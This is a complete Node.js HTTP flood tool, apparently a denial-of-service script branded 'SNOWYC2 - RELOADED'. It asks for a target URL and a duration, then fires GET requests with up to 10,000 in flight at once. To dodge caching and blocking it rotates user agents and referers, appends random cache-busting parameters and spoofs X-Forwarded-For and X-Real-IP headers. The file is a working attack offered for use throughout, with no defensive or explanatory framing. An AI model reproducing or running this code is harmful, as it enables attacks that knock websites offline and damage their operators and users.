const fs = require('fs');
const os = require('os');
const { request } = require('undici');
const process = require('process');
const readline = require('readline');

const REQUEST_TIMEOUT = 8000;

// === Load Lines ===
function loadLines(filename) {
    try {
        return fs.readFileSync(filename, 'utf8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line.length > 0);
    } catch {
        console.warn(`Warning: ${filename} missing or empty`);
        return [];
    }
}

const REFERERS = loadLines('refs.txt');
const USER_AGENTS = loadLines('ua.txt');

const UA_POOL = Array.from({ length: 10000 }, () =>
    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0'
);

// === Attack Engine ===
class AttackEngine {
    constructor(target, duration) {
        this.target = target;
        this.duration = duration * 1000;
        this.startTime = Date.now();
        this.stats = {
            total: 0,
            success: 0,
            errors: 0,
            peakRps: 0
        };
        this.uaIndex = 0;
        this.lastTotal = 0;
    }

    getRandomUA() {
        this.uaIndex = (this.uaIndex + 1) % UA_POOL.length;
        return UA_POOL[this.uaIndex];
    }

    getRandomReferer() {
        return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
    }

    async makeRequest() {
        const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
        const headers = {
            'User-Agent': this.getRandomUA(),
            'Referer': this.getRandomReferer(),
            'X-Forwarded-For': randomIP,
            'X-Real-IP': randomIP,
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        };

        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;

        try {
            const { statusCode } = await request(urlWithNoise, {
                headers,
                method: 'GET',
                throwOnError: false,
                maxRedirections: 0
            });

            if (statusCode === 200) {
                this.stats.success++;
            } else {
                this.stats.errors++;
            }
        } catch {
            this.stats.errors++;
        }

        this.stats.total++;
    }

    async runAttack() {
        this.showIntro();
        const queue = [];
        const endTime = Date.now() + this.duration;

        const statsInterval = setInterval(() => {
            const rps = (this.stats.total - this.lastTotal) / 0.2;
            this.lastTotal = this.stats.total;
            this.stats.peakRps = Math.max(this.stats.peakRps, rps);

            process.stdout.write(
                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${rps.toFixed(1)} `
            );
        }, 200);

        // Adaptive Request Flood
        while (Date.now() < endTime) {
            if (queue.length > 10000) {
                await new Promise(r => setTimeout(r, 10));
                continue;
            }

            const task = this.makeRequest().finally(() => {
                const idx = queue.indexOf(task);
                if (idx !== -1) queue.splice(idx, 1);
            });

            queue.push(task);
        }

        await Promise.all(queue);
        clearInterval(statsInterval);
        this.printSummary();
    }

    showIntro() {
        console.clear();
        console.log('\n  SNOWYC2 - RELOADED');
        console.log('  ============================================');
        console.log(`  TARGET: ${this.target}`);
        console.log(`  DURATION: ${this.duration / 1000}s`);
        console.log(`  MODE: ADAPTIVE STRIKE`);
        console.log('  ============================================\n');
    }

    printSummary() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const avgRps = this.stats.total / elapsed;
        console.log('\n\n  ATTACK FINISHED');
        console.log('  ============================================');
        console.log(`  TIME:        ${elapsed.toFixed(1)}s`);
        console.log(`  TOTAL:       ${this.stats.total}`);
        console.log(`  SUCCESS:     ${this.stats.success}`);
        console.log(`  ERRORS:      ${this.stats.errors}`);
        console.log(`  AVG RPS:     ${avgRps.toFixed(1)}`);
        console.log(`  PEAK RPS:    ${this.stats.peakRps.toFixed(1)}`);
        console.log('  ============================================\n');
    }
}

// === MAIN ===
(async () => {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = (q) => new Promise(resolve => rl.question(q, resolve));

    const targetInput = await ask("TARGET: ");
    let target = targetInput.trim();
    if (!target.startsWith("http")) {
        target = "http://" + target;
    }

    const durationInput = await ask("TIME (seconds): ");
    rl.close();

    const duration = parseInt(durationInput);
    if (isNaN(duration)) {
        console.log("Invalid time input.");
        return;
    }

    const engine = new AttackEngine(target, duration);
    try {
        await engine.runAttack();
    } catch (err) {
        console.error("Attack failed:", err.message);
    }
})();
